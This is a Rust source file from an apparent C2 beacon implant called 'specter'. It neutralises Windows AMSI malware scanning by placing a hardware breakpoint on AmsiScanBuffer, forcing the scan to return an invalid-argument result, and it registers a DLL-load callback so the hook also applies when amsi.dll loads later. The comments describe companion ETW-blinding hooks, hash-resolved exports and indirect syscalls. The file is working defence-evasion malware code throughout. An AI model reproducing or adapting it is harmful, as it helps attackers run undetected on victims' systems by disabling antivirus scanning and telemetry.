//! AMSI neutralization: the beacon-side glue (the notification layout and
//! the module-match decision live in `specter_core::amsi`, host-tested).
//!
//! At bootstrap: if amsi.dll is already mapped, arm its hook immediately
//! (Dr3, the slot kept free by the ETW hooks). Either way, register an
//! `LdrRegisterDllNotification` callback so a later load still gets hooked.
//! The callback keys on the instance through `gs`, exactly like the VEH:
//! notifications raised on threads that are not the beacon's are ignored —
//! the hooks only ever protect the beacon's own thread.

use core::ffi::c_void;

use specter_core::amsi::{
    amsi_dll_name_hash, loaded_module_is, LdrDllNotificationData, AMSI_E_INVALIDARG,
    LDR_DLL_NOTIFICATION_REASON_LOADED,
};
use specter_core::fnv::fnv1a64;
use specter_core::hwbp::HookTarget;
use specter_core::peb::Peb;

use crate::runtime::bootstrap;
use crate::runtime::hwbp;
use crate::runtime::syscalls::Syscalls;
use specter_core::hwbp::Hooks;

/// Hash of the function the hooks target.
const H_AMSI_SCAN_BUFFER: u64 = fnv1a64(b"AmsiScanBuffer");
/// Hash of the (undocumented but stable) ntdll registration export.
const H_LDR_REGISTER_DLL_NOTIFICATION: u64 = fnv1a64(b"LdrRegisterDllNotification");

/// `LdrRegisterDllNotification(Flags, NotificationFunction, Context, Cookie)`
/// — a regular ntdll call, not a syscall: resolved by hash, called normally.
type LdrRegisterDllNotificationFn = unsafe extern "system" fn(u32, usize, usize, *mut usize) -> i32;

/// Loader notification callback: when amsi.dll maps, resolve AmsiScanBuffer
/// in the fresh base and arm the beacon thread's Dr3.
///
/// # Safety
///
/// Registered by [`install`] with a valid function pointer; reads the
/// instance through `gs` (null on foreign threads — pass through).
#[unsafe(no_mangle)]
unsafe extern "system" fn spt_ldr_notification(
    reason: u32,
    data: *const LdrDllNotificationData,
    _context: usize,
) {
    if reason != LDR_DLL_NOTIFICATION_REASON_LOADED {
        return;
    }
    let inst = bootstrap::instance();
    if inst.is_null() {
        return;
    }
    let Some(base) = loaded_module_is(reason, data, amsi_dll_name_hash()) else {
        return;
    };
    let target = specter_core::peb::find_export(base, H_AMSI_SCAN_BUFFER);
    if target.is_null() {
        return;
    }
    (*inst).etw_hooks[3] = HookTarget {
        addr: target as u64,
        ret_value: AMSI_E_INVALIDARG,
    };
    let sys = &(*inst).syscalls;
    hwbp::arm(sys, &(*inst).etw_hooks);
}

/// Resolve AmsiScanBuffer in a mapped amsi.dll base and arm Dr3. The slot is
/// only claimed when the export resolves: a partial amsi.dll (defensive
/// tampering, version drift) disables the hook instead of arming garbage.
///
/// # Safety
///
/// `base` must be a mapped amsi.dll image; `inst` a live beacon instance.
unsafe fn hook_amsi(sys: &Syscalls, hooks: &mut Hooks, base: *mut c_void) {
    let target = specter_core::peb::find_export(base, H_AMSI_SCAN_BUFFER);
    if target.is_null() {
        return;
    }
    hooks[3] = HookTarget {
        addr: target as u64,
        ret_value: AMSI_E_INVALIDARG,
    };
    // Re-arm the four slots: Dr0-Dr2 (ETW) keep their addresses, Dr3 takes
    // the new one. The VEH handler is already installed.
    hwbp::arm(sys, hooks);
}

/// Install the deferred AMSI hook: hook now if amsi.dll is already mapped
/// (through the bootstrap-held hook table), and register the loader
/// notification for later loads (the callback reads the instance from gs,
/// valid once the bootstrap stores it).
///
/// # Safety
///
/// Must run on the beacon thread with resolved modules and a valid syscall
/// table (the arming goes through indirect syscalls).
pub unsafe fn install(peb: *mut Peb, ntdll: *mut c_void, sys: &Syscalls, hooks: &mut Hooks) {
    // Already mapped? Hook immediately. The bootstrap holds the hook table
    // here — the instance is not in the TEB yet (gs would read null).
    let already = specter_core::peb::find_module(peb, amsi_dll_name_hash());
    if !already.is_null() {
        hook_amsi(sys, hooks, already);
    }

    // Defer the rest through loader notifications.
    let register = specter_core::peb::find_export(ntdll, H_LDR_REGISTER_DLL_NOTIFICATION);
    if register.is_null() {
        return; // no notifications: the already-mapped path still applies
    }
    let register = *(register as *const LdrRegisterDllNotificationFn);
    let mut cookie: usize = 0;
    register(
        0,
        spt_ldr_notification as *const () as usize,
        0,
        &mut cookie,
    );
}
